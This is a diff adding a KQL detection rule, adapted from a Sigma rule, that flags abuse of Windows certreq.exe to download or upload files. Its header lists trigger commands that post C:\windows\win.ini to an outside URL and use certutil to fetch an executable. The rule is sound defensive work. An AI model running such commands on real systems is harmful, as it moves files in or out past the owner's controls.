@@ -1,0 +1,18 @@
+// Title: Suspicious Certreq.exe to Download
+// Desc: Detects a suspicious certreq execution taken from the LOLBAS examples, which can be abused to download (small) files
+// Ref - https://lolbas-project.github.io/lolbas/Binaries/Certreq/
+// Ref - https://dtm.uk/certreq/
+// MITRE:  (Command and Control: Ingress Tool Transfer)
+// Severity: high
+// Trigger: CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt
+// Trigger: certutil.exe -verifyctl -f -split http://7-zip.org/a/7z1604-x64.exe 7zip.exe
+// Usecase: upload and download from Internet
+// https://github.com/SigmaHQ/sigma/blob/master/rules/windows/proc_creation_win_lolbin_susp_certreq_download.yml
+// By: Frankie Li
+// On: 15-05-2023
+DeviceProcessEvents 
+| where ((FolderPath endswith @'\certreq.exe' or InitiatingProcessVersionInfoOriginalFileName =~ @'CertReq.exe' 
+    or ProcessVersionInfoOriginalFileName =~ @'CertReq.exe') 
+    and (ProcessCommandLine contains @' -Post ' and ProcessCommandLine contains @' -config ' 
+    and ProcessCommandLine contains @' http' and ProcessCommandLine contains @' C:\windows\win.ini '))
+| project Timestamp, DeviceName, AccountName, InitiatingProcessParentFileName, FolderPath, ProcessCommandLine
